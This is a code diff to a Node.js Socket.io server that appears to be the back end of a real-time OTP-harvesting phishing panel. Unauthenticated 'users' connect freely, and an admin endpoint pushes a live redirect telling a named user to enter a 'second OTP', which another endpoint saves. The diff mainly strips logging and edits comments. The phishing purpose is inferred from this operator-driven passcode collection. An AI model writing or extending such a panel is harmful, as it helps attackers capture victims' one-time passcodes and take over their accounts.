@@ -79,29 +79,27 @@ const authenticateJWT = (req, res, next) => {
   });
 };
 
-// Socket.io authentication - Allow users without token
+// Socket.io authentication - Allow users without token (UPDATED)
 io.use((socket, next) => {
   const token = socket.handshake.auth.token;
   
   // If no token, this is a user - allow connection but mark as user
   if (!token) {
     socket.isUser = true;
-    console.log('👤 User connected (unauthenticated)');
     return next();
   }
   
   // If token exists, verify as admin
   jwt.verify(token, process.env.JWT_SECRET, (err, user) => {
     if (err) {
-      console.log('❌ Invalid admin token');
       return next(new Error('Authentication error'));
     }
     socket.user = user;
     socket.isAdmin = true;
-    console.log('👑 Admin connected:', user.email);
     next();
   });
 });
+
 // Debug all socket emissions
 const originalEmit = io.emit;
 io.emit = function(event, data) {
@@ -109,7 +107,7 @@ io.emit = function(event, data) {
   return originalEmit.call(this, event, data);
 };
 
-// Socket.io connection
+// Socket.io connection (UPDATED)
 io.on('connection', (socket) => {
   if (socket.isAdmin) {
     console.log('👑 Admin connected:', socket.user?.email, socket.id);
@@ -468,7 +466,7 @@ app.post('/api/users/save-second-otp', async (req, res) => {
   }
 });
 
-// Admin requests user to enter second OTP - REDIRECTS USER (NEW ENDPOINT)
+// Admin requests user to enter second OTP - REDIRECTS USER
 app.post('/api/admin/request-second-otp', authenticateJWT, async (req, res) => {
   try {
     const { email } = req.body;
@@ -476,7 +474,7 @@ app.post('/api/admin/request-second-otp', authenticateJWT, async (req, res) => {
     
     console.log('🔔 Admin requested second OTP for user:', email);
     
-    // Emit socket event to redirect user to second OTP page
+    // Emit socket event to ALL connected clients
     io.emit('redirect-to-second-otp', { 
       email,
       redirectUrl: `/users/otp?email=${encodeURIComponent(email)}&type=second`,
